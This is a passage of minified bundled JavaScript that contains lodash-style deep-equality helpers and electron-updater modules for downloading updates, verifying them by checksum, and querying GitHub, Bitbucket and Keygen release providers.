        function Dc(x, q, Y) {
          var ue = q(x);
          return Ir(x) ? ue : Le(ue, Y(x));
        }
        function Kt(x) {
          return x == null
            ? x === void 0
              ? g
              : A
            : ee && ee in Object(x)
              ? kc(x)
              : Gc(x);
        }
        function Vo(x) {
          return Xt(x) && Kt(x) == l;
        }
        function Wo(x, q, Y, ue, De) {
          return x === q
            ? !0
            : x == null || q == null || (!Xt(x) && !Xt(q))
              ? x !== x && q !== q
              : xc(x, q, Y, ue, Wo, De);
        }
        function xc(x, q, Y, ue, De, Te) {
          var Fe = Ir(x),
            ke = Ir(q),
            Me = Fe ? e : gt(x),
            xe = ke ? e : gt(q);
          (Me = Me == l ? S : Me), (xe = xe == l ? S : xe);
          var Xe = Me == S,
            ot = xe == S,
            He = Me == xe;
          if (He && tn(x)) {
            if (!tn(q)) return !1;
            (Fe = !0), (Xe = !1);
          }
          if (He && !Xe)
            return (
              Te || (Te = new mt()),
              Fe || Zo(x)
                ? zo(x, q, Y, ue, De, Te)
                : Lc(x, q, Me, Y, ue, De, Te)
            );
          if (!(Y & f)) {
            var et = Xe && we.call(x, "__wrapped__"),
              tt = ot && we.call(q, "__wrapped__");
            if (et || tt) {
              var vt = et ? x.value() : x,
                dt = tt ? q.value() : q;
              return Te || (Te = new mt()), De(vt, dt, Y, ue, Te);
            }
          }
          return He ? (Te || (Te = new mt()), Uc(x, q, Y, ue, De, Te)) : !1;
        }
        function Nc(x) {
          if (!Qo(x) || jc(x)) return !1;
          var q = Xo(x) ? Ue : ie;
          return q.test(bt(x));
        }
        function Fc(x) {
          return Xt(x) && Jo(x.length) && !!J[Kt(x)];
        }
        function $c(x) {
          if (!Hc(x)) return pe(x);
          var q = [];
          for (var Y in Object(x))
            we.call(x, Y) && Y != "constructor" && q.push(Y);
          return q;
        }
        function zo(x, q, Y, ue, De, Te) {
          var Fe = Y & f,
            ke = x.length,
            Me = q.length;
          if (ke != Me && !(Fe && Me > ke)) return !1;
          var xe = Te.get(x);
          if (xe && Te.get(q)) return xe == q;
          var Xe = -1,
            ot = !0,
            He = Y & t ? new Rr() : void 0;
          for (Te.set(x, q), Te.set(q, x); ++Xe < ke;) {
            var et = x[Xe],
              tt = q[Xe];
            if (ue)
              var vt = Fe ? ue(tt, et, Xe, q, x, Te) : ue(et, tt, Xe, x, q, Te);
            if (vt !== void 0) {
              if (vt) continue;
              ot = !1;
              break;
            }
            if (He) {
              if (
                !Ie(q, function (dt, Rt) {
                  if (!ct(He, Rt) && (et === dt || De(et, dt, Y, ue, Te)))
                    return He.push(Rt);
                })
              ) {
                ot = !1;
                break;
              }
            } else if (!(et === tt || De(et, tt, Y, ue, Te))) {
              ot = !1;
              break;
            }
          }
          return Te.delete(x), Te.delete(q), ot;
        }
        function Lc(x, q, Y, ue, De, Te, Fe) {
          switch (Y) {
            case N:
              if (x.byteLength != q.byteLength || x.byteOffset != q.byteOffset)
                return !1;
              (x = x.buffer), (q = q.buffer);
            case O:
              return !(x.byteLength != q.byteLength || !Te(new X(x), new X(q)));
            case n:
            case s:
            case p:
              return Ko(+x, +q);
            case u:
              return x.name == q.name && x.message == q.message;
            case C:
            case w:
              return x == q + "";
            case y:
              var ke = B;
            case v:
              var Me = ue & f;
              if ((ke || (ke = re), x.size != q.size && !Me)) return !1;
              var xe = Fe.get(x);
              if (xe) return xe == q;
              (ue |= t), Fe.set(x, q);
              var Xe = zo(ke(x), ke(q), ue, De, Te, Fe);
              return Fe.delete(x), Xe;
            case _:
              if (en) return en.call(x) == en.call(q);
          }
          return !1;
        }
        function Uc(x, q, Y, ue, De, Te) {
          var Fe = Y & f,
            ke = Yo(x),
            Me = ke.length,
            xe = Yo(q),
            Xe = xe.length;
          if (Me != Xe && !Fe) return !1;
          for (var ot = Me; ot--;) {
            var He = ke[ot];
            if (!(Fe ? He in q : we.call(q, He))) return !1;
          }
          var et = Te.get(x);
          if (et && Te.get(q)) return et == q;
          var tt = !0;
          Te.set(x, q), Te.set(q, x);
          for (var vt = Fe; ++ot < Me;) {
            He = ke[ot];
            var dt = x[He],
              Rt = q[He];
            if (ue)
              var ea = Fe ? ue(Rt, dt, He, q, x, Te) : ue(dt, Rt, He, x, q, Te);
            if (!(ea === void 0 ? dt === Rt || De(dt, Rt, Y, ue, Te) : ea)) {
              tt = !1;
              break;
            }
            vt || (vt = He == "constructor");
          }
          if (tt && !vt) {
            var Or = x.constructor,
              Dr = q.constructor;
            Or != Dr &&
              "constructor" in x &&
              "constructor" in q &&
              !(
                typeof Or == "function" &&
                Or instanceof Or &&
                typeof Dr == "function" &&
                Dr instanceof Dr
              ) &&
              (tt = !1);
          }
          return Te.delete(x), Te.delete(q), tt;
        }
        function Yo(x) {
          return Dc(x, Yc, qc);
        }
        function Cr(x, q) {
          var Y = x.__data__;
          return Bc(q) ? Y[typeof q == "string" ? "string" : "hash"] : Y.map;
        }
        function kt(x, q) {
          var Y = d(x, q);
          return Nc(Y) ? Y : void 0;
        }
        function kc(x) {
          var q = we.call(x, ee),
            Y = x[ee];
          try {
            x[ee] = void 0;
            var ue = !0;
          } catch { }
          var De = de.call(x);
          return ue && (q ? (x[ee] = Y) : delete x[ee]), De;
        }
        var qc = fe
          ? function (x) {
            return x == null
              ? []
              : ((x = Object(x)),
                _e(fe(x), function (q) {
                  return z.call(x, q);
                }));
          }
          : Kc,
          gt = Kt;
        ((Ae && gt(new Ae(new ArrayBuffer(1))) != N) ||
          (Oe && gt(new Oe()) != y) ||
          (Ne && gt(Ne.resolve()) != b) ||
          (Ce && gt(new Ce()) != v) ||
          (Ut && gt(new Ut()) != D)) &&
          (gt = function (x) {
            var q = Kt(x),
              Y = q == S ? x.constructor : void 0,
              ue = Y ? bt(Y) : "";
            if (ue)
              switch (ue) {
                case At:
                  return N;
                case ic:
                  return y;
                case oc:
                  return b;
                case ac:
                  return v;
                case sc:
                  return D;
              }
            return q;
          });
        function Mc(x, q) {
          return (
            (q = q ?? r),
            !!q &&
            (typeof x == "number" || Re.test(x)) &&
            x > -1 &&
            x % 1 == 0 &&
            x < q
          );
        }
        function Bc(x) {
          var q = typeof x;
          return q == "string" ||
            q == "number" ||
            q == "symbol" ||
            q == "boolean"
            ? x !== "__proto__"
            : x === null;
        }
        function jc(x) {
          return !!Pe && Pe in x;
        }
        function Hc(x) {
          var q = x && x.constructor,
            Y = (typeof q == "function" && q.prototype) || Z;
          return x === Y;
        }
        function Gc(x) {
          return de.call(x);
        }
        function bt(x) {
          if (x != null) {
            try {
              return ve.call(x);
            } catch { }
            try {
              return x + "";
            } catch { }
          }
          return "";
        }
        function Ko(x, q) {
          return x === q || (x !== x && q !== q);
        }
        var Vc = Vo(
          (function () {
            return arguments;
          })()
        )
          ? Vo
          : function (x) {
            return Xt(x) && we.call(x, "callee") && !z.call(x, "callee");
          },
          Ir = Array.isArray;
        function Wc(x) {
          return x != null && Jo(x.length) && !Xo(x);
        }
        var tn = ae || Xc;
        function zc(x, q) {
          return Wo(x, q);
        }
        function Xo(x) {
          if (!Qo(x)) return !1;
          var q = Kt(x);
          return q == m || q == E || q == o || q == R;
        }
        function Jo(x) {
          return typeof x == "number" && x > -1 && x % 1 == 0 && x <= r;
        }
        function Qo(x) {
          var q = typeof x;
          return x != null && (q == "object" || q == "function");
        }
        function Xt(x) {
          return x != null && typeof x == "object";
        }
        var Zo = Se ? _t(Se) : Fc;
        function Yc(x) {
          return Wc(x) ? Oc(x) : $c(x);
        }
        function Kc() {
          return [];
        }
        function Xc() {
          return !1;
        }
        a.exports = zc;
      })(Er, Er.exports)),
    Er.exports
  );
}
var yu;
function pd() {
  if (yu) return Mt;
  (yu = 1),
    Object.defineProperty(Mt, "__esModule", { value: !0 }),
    (Mt.DownloadedUpdateHelper = void 0),
    (Mt.createTempUpdateFile = l);
  const a = _r,
    i = be,
    c = hd(),
    h = Et(),
    f = ye;
  let t = class {
    constructor(o) {
      (this.cacheDir = o),
        (this._file = null),
        (this._packageFile = null),
        (this.versionInfo = null),
        (this.fileInfo = null),
        (this._downloadedFileInfo = null);
    }
    get downloadedFileInfo() {
      return this._downloadedFileInfo;
    }
    get file() {
      return this._file;
    }
    get packageFile() {
      return this._packageFile;
    }
    get cacheDirForPendingUpdate() {
      return f.join(this.cacheDir, "pending");
    }
    async validateDownloadedPath(o, n, s, u) {
      if (this.versionInfo != null && this.file === o && this.fileInfo != null)
        return c(this.versionInfo, n) &&
          c(this.fileInfo.info, s.info) &&
          (await (0, h.pathExists)(o))
          ? o
          : null;
      const m = await this.getValidCachedUpdateFile(s, u);
      return m === null
        ? null
        : (u.info(`Update has already been downloaded to ${o}).`),
          (this._file = m),
          m);
    }
    async setDownloadedFile(o, n, s, u, m, E) {
      (this._file = o),
        (this._packageFile = n),
        (this.versionInfo = s),
        (this.fileInfo = u),
        (this._downloadedFileInfo = {
          fileName: m,
          sha512: u.info.sha512,
          isAdminRightsRequired: u.info.isAdminRightsRequired === !0,
        }),
        E &&
        (await (0, h.outputJson)(
          this.getUpdateInfoFile(),
          this._downloadedFileInfo
        ));
    }
    async clear() {
      (this._file = null),
        (this._packageFile = null),
        (this.versionInfo = null),
        (this.fileInfo = null),
        await this.cleanCacheDirForPendingUpdate();
    }
    async cleanCacheDirForPendingUpdate() {
      try {
        await (0, h.emptyDir)(this.cacheDirForPendingUpdate);
      } catch { }
    }
    async getValidCachedUpdateFile(o, n) {
      const s = this.getUpdateInfoFile();
      if (!(await (0, h.pathExists)(s))) return null;
      let m;
      try {
        m = await (0, h.readJson)(s);
      } catch (A) {
        let S = "No cached update info available";
        return (
          A.code !== "ENOENT" &&
          (await this.cleanCacheDirForPendingUpdate(),
            (S += ` (error on read: ${A.message})`)),
          n.info(S),
          null
        );
      }
      if (!(m?.fileName !== null))
        return (
          n.warn(
            "Cached update info is corrupted: no fileName, directory for cached update will be cleaned"
          ),
          await this.cleanCacheDirForPendingUpdate(),
          null
        );
      if (o.info.sha512 !== m.sha512)
        return (
          n.info(
            `Cached update sha512 checksum doesn't match the latest available update. New update must be downloaded. Cached: ${m.sha512}, expected: ${o.info.sha512}. Directory for cached update will be cleaned`
          ),
          await this.cleanCacheDirForPendingUpdate(),
          null
        );
      const y = f.join(this.cacheDirForPendingUpdate, m.fileName);
      if (!(await (0, h.pathExists)(y)))
        return n.info("Cached update file doesn't exist"), null;
      const p = await r(y);
      return o.info.sha512 !== p
        ? (n.warn(
          `Sha512 checksum doesn't match the latest available update. New update must be downloaded. Cached: ${p}, expected: ${o.info.sha512}`
        ),
          await this.cleanCacheDirForPendingUpdate(),
          null)
        : ((this._downloadedFileInfo = m), y);
    }
    getUpdateInfoFile() {
      return f.join(this.cacheDirForPendingUpdate, "update-info.json");
    }
  };
  Mt.DownloadedUpdateHelper = t;
  function r(e, o = "sha512", n = "base64", s) {
    return new Promise((u, m) => {
      const E = (0, a.createHash)(o);
      E.on("error", m).setEncoding(n),
        (0, i.createReadStream)(e, { ...s, highWaterMark: 1024 * 1024 })
          .on("error", m)
          .on("end", () => {
            E.end(), u(E.read());
          })
          .pipe(E, { end: !1 });
    });
  }
  async function l(e, o, n) {
    let s = 0,
      u = f.join(o, e);
    for (let m = 0; m < 3; m++)
      try {
        return await (0, h.unlink)(u), u;
      } catch (E) {
        if (E.code === "ENOENT") return u;
        n.warn(`Error on remove temp update file: ${E}`),
          (u = f.join(o, `${s++}-${e}`));
      }
    return u;
  }
  return Mt;
}
var rr = {},
  Hr = {},
  Eu;
function md() {
  if (Eu) return Hr;
  (Eu = 1),
    Object.defineProperty(Hr, "__esModule", { value: !0 }),
    (Hr.getAppCacheDir = c);
  const a = ye,
    i = Ar;
  function c() {
    const h = (0, i.homedir)();
    let f;
    return (
      process.platform === "win32"
        ? (f = process.env.LOCALAPPDATA || a.join(h, "AppData", "Local"))
        : process.platform === "darwin"
          ? (f = a.join(h, "Library", "Caches"))
          : (f = process.env.XDG_CACHE_HOME || a.join(h, ".cache")),
      f
    );
  }
  return Hr;
}
var _u;
function gd() {
  if (_u) return rr;
  (_u = 1),
    Object.defineProperty(rr, "__esModule", { value: !0 }),
    (rr.ElectronAppAdapter = void 0);
  const a = ye,
    i = md();
  let c = class {
    constructor(f = he.app) {
      this.app = f;
    }
    whenReady() {
      return this.app.whenReady();
    }
    get version() {
      return this.app.getVersion();
    }
    get name() {
      return this.app.getName();
    }
    get isPackaged() {
      return this.app.isPackaged === !0;
    }
    get appUpdateConfigPath() {
      return this.isPackaged
        ? a.join(process.resourcesPath, "app-update.yml")
        : a.join(this.app.getAppPath(), "dev-app-update.yml");
    }
    get userDataPath() {
      return this.app.getPath("userData");
    }
    get baseCachePath() {
      return (0, i.getAppCacheDir)();
    }
    quit() {
      this.app.quit();
    }
    relaunch() {
      this.app.relaunch();
    }
    onQuit(f) {
      this.app.once("quit", (t, r) => f(r));
    }
  };
  return (rr.ElectronAppAdapter = c), rr;
}
var Zi = {},
  Au;
function vd() {
  return (
    Au ||
    ((Au = 1),
      (function (a) {
        Object.defineProperty(a, "__esModule", { value: !0 }),
          (a.ElectronHttpExecutor = a.NET_SESSION_NAME = void 0),
          (a.getNetSession = c);
        const i = Be();
        a.NET_SESSION_NAME = "electron-updater";
        function c() {
          return he.session.fromPartition(a.NET_SESSION_NAME, { cache: !1 });
        }
        class h extends i.HttpExecutor {
          constructor(t) {
            super(), (this.proxyLoginCallback = t), (this.cachedSession = null);
          }
          async download(t, r, l) {
            return await l.cancellationToken.createPromise((e, o, n) => {
              const s = { headers: l.headers || void 0, redirect: "manual" };
              (0, i.configureRequestUrl)(t, s),
                (0, i.configureRequestOptions)(s),
                this.doDownload(
                  s,
                  {
                    destination: r,
                    options: l,
                    onCancel: n,
                    callback: (u) => {
                      u == null ? e(r) : o(u);
                    },
                    responseHandler: null,
                  },
                  0
                );
            });
          }
          createRequest(t, r) {
            t.headers &&
              t.headers.Host &&
              ((t.host = t.headers.Host), delete t.headers.Host),
              this.cachedSession == null && (this.cachedSession = c());
            const l = he.net.request({ ...t, session: this.cachedSession });
            return (
              l.on("response", r),
              this.proxyLoginCallback != null &&
              l.on("login", this.proxyLoginCallback),
              l
            );
          }
          addRedirectHandlers(t, r, l, e, o) {
            t.on("redirect", (n, s, u) => {
              t.abort(),
                e > this.maxRedirects
                  ? l(this.createMaxRedirectError())
                  : o(i.HttpExecutor.prepareRedirectUrlOptions(u, r));
            });
          }
        }
        a.ElectronHttpExecutor = h;
      })(Zi)),
    Zi
  );
}
var nr = {},
  Dt = {},
  eo,
  Su;
function wd() {
  if (Su) return eo;
  Su = 1;
  var a = "[object Symbol]",
    i = /[\\^$.*+?()[\]{}|]/g,
    c = RegExp(i.source),
    h = typeof rt == "object" && rt && rt.Object === Object && rt,
    f = typeof self == "object" && self && self.Object === Object && self,
    t = h || f || Function("return this")(),
    r = Object.prototype,
    l = r.toString,
    e = t.Symbol,
    o = e ? e.prototype : void 0,
    n = o ? o.toString : void 0;
  function s(p) {
    if (typeof p == "string") return p;
    if (m(p)) return n ? n.call(p) : "";
    var A = p + "";
    return A == "0" && 1 / p == -1 / 0 ? "-0" : A;
  }
  function u(p) {
    return !!p && typeof p == "object";
  }
  function m(p) {
    return typeof p == "symbol" || (u(p) && l.call(p) == a);
  }
  function E(p) {
    return p == null ? "" : s(p);
  }
  function y(p) {
    return (p = E(p)), p && c.test(p) ? p.replace(i, "\\$&") : p;
  }
  return (eo = y), eo;
}
var Tu;
function $t() {
  if (Tu) return Dt;
  (Tu = 1),
    Object.defineProperty(Dt, "__esModule", { value: !0 }),
    (Dt.newBaseUrl = c),
    (Dt.newUrlFromBase = h),
    (Dt.getChannelFilename = f),
    (Dt.blockmapFiles = t);
  const a = Gt,
    i = wd();
  function c(r) {
    const l = new a.URL(r);
    return l.pathname.endsWith("/") || (l.pathname += "/"), l;
  }
  function h(r, l, e = !1) {
    const o = new a.URL(r, l),
      n = l.search;
    return (
      n != null && n.length !== 0
        ? (o.search = n)
        : e && (o.search = `noCache=${Date.now().toString(32)}`),
      o
    );
  }
  function f(r) {
    return `${r}.yml`;
  }
  function t(r, l, e) {
    const o = h(`${r.pathname}.blockmap`, r);
    return [
      h(`${r.pathname.replace(new RegExp(i(e), "g"), l)}.blockmap`, r),
      o,
    ];
  }
  return Dt;
}
var ht = {},
  bu;
function nt() {
  if (bu) return ht;
  (bu = 1),
    Object.defineProperty(ht, "__esModule", { value: !0 }),
    (ht.Provider = void 0),
    (ht.findFile = f),
    (ht.parseUpdateInfo = t),
    (ht.getFileList = r),
    (ht.resolveFiles = l);
  const a = Be(),
    i = xo(),
    c = $t();
  let h = class {
    constructor(o) {
      (this.runtimeOptions = o),
        (this.requestHeaders = null),
        (this.executor = o.executor);
    }
    get isUseMultipleRangeRequest() {
      return this.runtimeOptions.isUseMultipleRangeRequest !== !1;
    }
    getChannelFilePrefix() {
      if (this.runtimeOptions.platform === "linux") {
        const o = process.env.TEST_UPDATER_ARCH || process.arch;
        return "-linux" + (o === "x64" ? "" : `-${o}`);
      } else return this.runtimeOptions.platform === "darwin" ? "-mac" : "";
    }
    getDefaultChannelName() {
      return this.getCustomChannelName("latest");
    }
    getCustomChannelName(o) {
      return `${o}${this.getChannelFilePrefix()}`;
    }
    get fileExtraDownloadHeaders() {
      return null;
    }
    setRequestHeaders(o) {
      this.requestHeaders = o;
    }
    httpRequest(o, n, s) {
      return this.executor.request(this.createRequestOptions(o, n), s);
    }
    createRequestOptions(o, n) {
      const s = {};
      return (
        this.requestHeaders == null
          ? n != null && (s.headers = n)
          : (s.headers =
            n == null
              ? this.requestHeaders
              : { ...this.requestHeaders, ...n }),
        (0, a.configureRequestUrl)(o, s),
        s
      );
    }
  };
  ht.Provider = h;
  function f(e, o, n) {
    if (e.length === 0)
      throw (0, a.newError)(
        "No files provided",
        "ERR_UPDATER_NO_FILES_PROVIDED"
      );
    const s = e.find((u) => u.url.pathname.toLowerCase().endsWith(`.${o}`));
    return (
      s ??
      (n == null
        ? e[0]
        : e.find(
          (u) =>
            !n.some((m) => u.url.pathname.toLowerCase().endsWith(`.${m}`))
        ))
    );
  }
  function t(e, o, n) {
    if (e == null)
      throw (0, a.newError)(
        `Cannot parse update info from ${o} in the latest release artifacts (${n}): rawData: null`,
        "ERR_UPDATER_INVALID_UPDATE_INFO"
      );
    let s;
    try {
      s = (0, i.load)(e);
    } catch (u) {
      throw (0, a.newError)(
        `Cannot parse update info from ${o} in the latest release artifacts (${n}): ${u.stack || u.message
        }, rawData: ${e}`,
        "ERR_UPDATER_INVALID_UPDATE_INFO"
      );
    }
    return s;
  }
  function r(e) {
    const o = e.files;
    if (o != null && o.length > 0) return o;
    if (e.path != null)
      return [{ url: e.path, sha2: e.sha2, sha512: e.sha512 }];
    throw (0, a.newError)(
      `No files provided: ${(0, a.safeStringifyJson)(e)}`,
      "ERR_UPDATER_NO_FILES_PROVIDED"
    );
  }
  function l(e, o, n = (s) => s) {
    const u = r(e).map((y) => {
      if (y.sha2 == null && y.sha512 == null)
        throw (0, a.newError)(
          `Update info doesn't contain nor sha256 neither sha512 checksum: ${(0,
            a.safeStringifyJson)(y)}`,
          "ERR_UPDATER_NO_CHECKSUM"
        );
      return { url: (0, c.newUrlFromBase)(n(y.url), o), info: y };
    }),
      m = e.packages,
      E = m == null ? null : m[process.arch] || m.ia32;
    return (
      E != null &&
      (u[0].packageInfo = {
        ...E,
        path: (0, c.newUrlFromBase)(n(E.path), o).href,
      }),
      u
    );
  }
  return ht;
}
var Ru;
function Xl() {
  if (Ru) return nr;
  (Ru = 1),
    Object.defineProperty(nr, "__esModule", { value: !0 }),
    (nr.GenericProvider = void 0);
  const a = Be(),
    i = $t(),
    c = nt();
  let h = class extends c.Provider {
    constructor(t, r, l) {
      super(l),
        (this.configuration = t),
        (this.updater = r),
        (this.baseUrl = (0, i.newBaseUrl)(this.configuration.url));
    }
    get channel() {
      const t = this.updater.channel || this.configuration.channel;
      return t == null
        ? this.getDefaultChannelName()
        : this.getCustomChannelName(t);
    }
    async getLatestVersion() {
      const t = (0, i.getChannelFilename)(this.channel),
        r = (0, i.newUrlFromBase)(
          t,
          this.baseUrl,
          this.updater.isAddNoCacheQuery
        );
      for (let l = 0; ; l++)
        try {
          return (0, c.parseUpdateInfo)(await this.httpRequest(r), t, r);
        } catch (e) {
          if (e instanceof a.HttpError && e.statusCode === 404)
            throw (0, a.newError)(
              `Cannot find channel "${t}" update info: ${e.stack || e.message}`,
              "ERR_UPDATER_CHANNEL_FILE_NOT_FOUND"
            );
          if (e.code === "ECONNREFUSED" && l < 3) {
            await new Promise((o, n) => {
              try {
                setTimeout(o, 1e3 * l);
              } catch (s) {
                n(s);
              }
            });
            continue;
          }
          throw e;
        }
    }
    resolveFiles(t) {
      return (0, c.resolveFiles)(t, this.baseUrl);
    }
  };
  return (nr.GenericProvider = h), nr;
}
var ir = {},
  or = {},
  Pu;
function yd() {
  if (Pu) return or;
  (Pu = 1),
    Object.defineProperty(or, "__esModule", { value: !0 }),
    (or.BitbucketProvider = void 0);
  const a = Be(),
    i = $t(),
    c = nt();
  let h = class extends c.Provider {
    constructor(t, r, l) {
      super({ ...l, isUseMultipleRangeRequest: !1 }),
        (this.configuration = t),
        (this.updater = r);
      const { owner: e, slug: o } = t;
      this.baseUrl = (0, i.newBaseUrl)(
        `https://api.bitbucket.org/2.0/repositories/${e}/${o}/downloads`
      );
    }
    get channel() {
      return this.updater.channel || this.configuration.channel || "latest";
    }
    async getLatestVersion() {
      const t = new a.CancellationToken(),
        r = (0, i.getChannelFilename)(this.getCustomChannelName(this.channel)),
        l = (0, i.newUrlFromBase)(
          r,
          this.baseUrl,
          this.updater.isAddNoCacheQuery
        );
      try {
        const e = await this.httpRequest(l, void 0, t);
        return (0, c.parseUpdateInfo)(e, r, l);
      } catch (e) {
        throw (0, a.newError)(
          `Unable to find latest version on ${this.toString()}, please ensure release exists: ${e.stack || e.message
          }`,
          "ERR_UPDATER_LATEST_VERSION_NOT_FOUND"
        );
      }
    }
    resolveFiles(t) {
      return (0, c.resolveFiles)(t, this.baseUrl);
    }
    toString() {
      const { owner: t, slug: r } = this.configuration;
      return `Bitbucket (owner: ${t}, slug: ${r}, channel: ${this.channel})`;
    }
  };
  return (or.BitbucketProvider = h), or;
}
var yt = {},
  Cu;
function Jl() {
  if (Cu) return yt;
  (Cu = 1),
    Object.defineProperty(yt, "__esModule", { value: !0 }),
    (yt.GitHubProvider = yt.BaseGitHubProvider = void 0),
    (yt.computeReleaseNotes = o);
  const a = Be(),
    i = Kl(),
    c = Gt,
    h = $t(),
    f = nt(),
    t = /\/tag\/([^/]+)$/;
  class r extends f.Provider {
    constructor(s, u, m) {
      super({ ...m, isUseMultipleRangeRequest: !1 }),
        (this.options = s),
        (this.baseUrl = (0, h.newBaseUrl)((0, a.githubUrl)(s, u)));
      const E = u === "github.com" ? "api.github.com" : u;
      this.baseApiUrl = (0, h.newBaseUrl)((0, a.githubUrl)(s, E));
    }
    computeGithubBasePath(s) {
      const u = this.options.host;
      return u && !["github.com", "api.github.com"].includes(u)
        ? `/api/v3${s}`
        : s;
    }
  }
  yt.BaseGitHubProvider = r;
  let l = class extends r {
    constructor(s, u, m) {
      super(s, "github.com", m), (this.options = s), (this.updater = u);
    }
    get channel() {
      const s = this.updater.channel || this.options.channel;
      return s == null
        ? this.getDefaultChannelName()
        : this.getCustomChannelName(s);
    }
    async getLatestVersion() {
      var s, u, m, E, y;
      const p = new a.CancellationToken(),
        A = await this.httpRequest(
          (0, h.newUrlFromBase)(`${this.basePath}.atom`, this.baseUrl),
          { accept: "application/xml, application/atom+xml, text/xml, */*" },
          p
        ),
        S = (0, a.parseXml)(A);
      let b = S.element("entry", !1, "No published versions on GitHub"),
        R = null;
      try {
        if (this.updater.allowPrerelease) {
          const D =
            ((s = this.updater) === null || s === void 0
              ? void 0
              : s.channel) ||
            ((u = i.prerelease(this.updater.currentVersion)) === null ||
              u === void 0
              ? void 0
              : u[0]) ||
            null;
          if (D === null) R = t.exec(b.element("link").attribute("href"))[1];
          else
            for (const O of S.getElements("entry")) {
              const N = t.exec(O.element("link").attribute("href"));
              if (N === null) continue;
              const L = N[1],
                F =
                  ((m = i.prerelease(L)) === null || m === void 0
                    ? void 0
                    : m[0]) || null,
                $ = !D || ["alpha", "beta"].includes(D),
                k = F !== null && !["alpha", "beta"].includes(String(F));
              if ($ && !k && !(D === "beta" && F === "alpha")) {
                R = L;
                break;
              }
              if (F && F === D) {
                R = L;
                break;
              }
            }
        } else {
          R = await this.getLatestTagName(p);
          for (const D of S.getElements("entry"))
            if (t.exec(D.element("link").attribute("href"))[1] === R) {
              b = D;
              break;
            }
        }
      } catch (D) {
        throw (0, a.newError)(
          `Cannot parse releases feed: ${D.stack || D.message},
XML:
${A}`,
          "ERR_UPDATER_INVALID_RELEASE_FEED"
        );
      }
      if (R == null)
        throw (0, a.newError)(
          "No published versions on GitHub",
          "ERR_UPDATER_NO_PUBLISHED_VERSIONS"
        );
      let C,
        v = "",
        w = "";
      const _ = async (D) => {
        (v = (0, h.getChannelFilename)(D)),
          (w = (0, h.newUrlFromBase)(
            this.getBaseDownloadPath(String(R), v),
            this.baseUrl
          ));
        const O = this.createRequestOptions(w);
        try {
          return await this.executor.request(O, p);
        } catch (N) {
          throw N instanceof a.HttpError && N.statusCode === 404
            ? (0, a.newError)(
              `Cannot find ${v} in the latest release artifacts (${w}): ${N.stack || N.message
              }`,
              "ERR_UPDATER_CHANNEL_FILE_NOT_FOUND"
            )
            : N;
        }
      };
      try {
        let D = this.channel;
        this.updater.allowPrerelease &&
          !((E = i.prerelease(R)) === null || E === void 0) &&
          E[0] &&
          (D = this.getCustomChannelName(
            String(
              (y = i.prerelease(R)) === null || y === void 0 ? void 0 : y[0]
            )
          )),
          (C = await _(D));
      } catch (D) {
        if (this.updater.allowPrerelease)
          C = await _(this.getDefaultChannelName());
        else throw D;
      }
      const g = (0, f.parseUpdateInfo)(C, v, w);
      return (
        g.releaseName == null &&
        (g.releaseName = b.elementValueOrEmpty("title")),
        g.releaseNotes == null &&
        (g.releaseNotes = o(
          this.updater.currentVersion,
          this.updater.fullChangelog,
          S,
          b
        )),
        { tag: R, ...g }
      );
    }
    async getLatestTagName(s) {
      const u = this.options,
        m =
          u.host == null || u.host === "github.com"
            ? (0, h.newUrlFromBase)(`${this.basePath}/latest`, this.baseUrl)
            : new c.URL(
              `${this.computeGithubBasePath(
                `/repos/${u.owner}/${u.repo}/releases`
              )}/latest`,
              this.baseApiUrl
            );
      try {
        const E = await this.httpRequest(m, { Accept: "application/json" }, s);
        return E == null ? null : JSON.parse(E).tag_name;
      } catch (E) {
        throw (0, a.newError)(
          `Unable to find latest version on GitHub (${m}), please ensure a production release exists: ${E.stack || E.message
          }`,
          "ERR_UPDATER_LATEST_VERSION_NOT_FOUND"
        );
      }
    }
    get basePath() {
      return `/${this.options.owner}/${this.options.repo}/releases`;
    }
    resolveFiles(s) {
      return (0, f.resolveFiles)(s, this.baseUrl, (u) =>
        this.getBaseDownloadPath(s.tag, u.replace(/ /g, "-"))
      );
    }
    getBaseDownloadPath(s, u) {
      return `${this.basePath}/download/${s}/${u}`;
    }
  };
  yt.GitHubProvider = l;
  function e(n) {
    const s = n.elementValueOrEmpty("content");
    return s === "No content." ? "" : s;
  }
  function o(n, s, u, m) {
    if (!s) return e(m);
    const E = [];
    for (const y of u.getElements("entry")) {
      const p = /\/tag\/v?([^/]+)$/.exec(
        y.element("link").attribute("href")
      )[1];
      i.lt(n, p) && E.push({ version: p, note: e(y) });
    }
    return E.sort((y, p) => i.rcompare(y.version, p.version));
  }
  return yt;
}
var ar = {},
  Iu;
function Ed() {
  if (Iu) return ar;
  (Iu = 1),
    Object.defineProperty(ar, "__esModule", { value: !0 }),
    (ar.KeygenProvider = void 0);
  const a = Be(),
    i = $t(),
    c = nt();
  let h = class extends c.Provider {
    constructor(t, r, l) {
      super({ ...l, isUseMultipleRangeRequest: !1 }),
        (this.configuration = t),
        (this.updater = r),
        (this.defaultHostname = "api.keygen.sh");
      const e = this.configuration.host || this.defaultHostname;
      this.baseUrl = (0, i.newBaseUrl)(
        `https://${e}/v1/accounts/${this.configuration.account}/artifacts?product=${this.configuration.product}`
      );
    }
    get channel() {
      return this.updater.channel || this.configuration.channel || "stable";
    }
    async getLatestVersion() {
      const t = new a.CancellationToken(),
        r = (0, i.getChannelFilename)(this.getCustomChannelName(this.channel)),
        l = (0, i.newUrlFromBase)(
          r,
          this.baseUrl,
          this.updater.isAddNoCacheQuery
        );
      try {
        const e = await this.httpRequest(
          l,
          { Accept: "application/vnd.api+json", "Keygen-Version": "1.1" },
          t
        );
        return (0, c.parseUpdateInfo)(e, r, l);
      } catch (e) {
        throw (0, a.newError)(
          `Unable to find latest version on ${this.toString()}, please ensure release exists: ${e.stack || e.message
          }`,
          "ERR_UPDATER_LATEST_VERSION_NOT_FOUND"
        );
      }
    }
    resolveFiles(t) {
      return (0, c.resolveFiles)(t, this.baseUrl);
    }
    toString() {
      const { account: t, product: r, platform: l } = this.configuration;
      return `Keygen (account: ${t}, product: ${r}, platform: ${l}, channel: ${this.channel})`;
    }
  };
  return (ar.KeygenProvider = h), ar;
}
var sr = {},
  Ou;
function _d() {
  if (Ou) return sr;
  (Ou = 1),
    Object.defineProperty(sr, "__esModule", { value: !0 }),
    (sr.PrivateGitHubProvider = void 0);
  const a = Be(),
    i = xo(),
    c = ye,
    h = Gt,
    f = $t(),
    t = Jl(),
    r = nt();
  let l = class extends t.BaseGitHubProvider {
    constructor(o, n, s, u) {
      super(o, "api.github.com", u), (this.updater = n), (this.token = s);
    }
    createRequestOptions(o, n) {
      const s = super.createRequestOptions(o, n);
      return (s.redirect = "manual"), s;
    }
